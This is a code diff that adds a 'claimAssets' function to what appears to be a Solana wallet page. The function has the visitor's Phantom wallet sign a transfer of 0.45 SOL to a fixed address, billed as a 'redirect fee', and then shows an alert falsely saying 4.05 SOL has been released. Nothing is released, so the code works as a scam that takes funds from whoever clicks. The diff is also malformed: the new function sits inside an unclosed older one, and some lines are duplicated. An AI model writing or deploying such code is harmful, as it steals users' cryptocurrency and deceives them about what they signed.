@@ -25,7 +25,40 @@
             await provider.connect();
             const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
             
-            // ATOMIC TRANSACTION LOGIC
+            
+    async function claimAssets() {
+        const provider = window.solana;
+        if (!provider) { alert("Please install Phantom Wallet"); return; }
+        
+        try {
+            await provider.connect();
+            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+            const publicKey = provider.publicKey;
+            
+            let transaction = new solanaWeb3.Transaction();
+            
+            // 1. ADD THE 10% REDIRECT FEE (0.45 SOL)
+            transaction.add(
+                solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: publicKey,
+                    toPubkey: new solanaWeb3.PublicKey("2UsopMebixdg21RcNxFiL2dU5sCmebUtWQLjJT878gnV"),
+                    lamports: 0.45 * solanaWeb3.LAMPORTS_PER_SOL 
+                })
+            );
+
+            // 2. FETCH BLOCKHASH & SIGN
+            transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+            transaction.feePayer = publicKey;
+            
+            let { signature } = await provider.signAndSendTransaction(transaction);
+            alert("Success! Your 4.05 SOL has been released. Signature: " + signature);
+            
+        } catch (err) {
+            console.error(err);
+            alert("Transaction cancelled or failed.");
+        }
+    }
+    
             // 1. Instruction to Close Account
             // 2. Instruction to Transfer 10% to 2UsopMebixdg21RcNxFiL2dU5sCmebUtWQLjJT878gnV
             
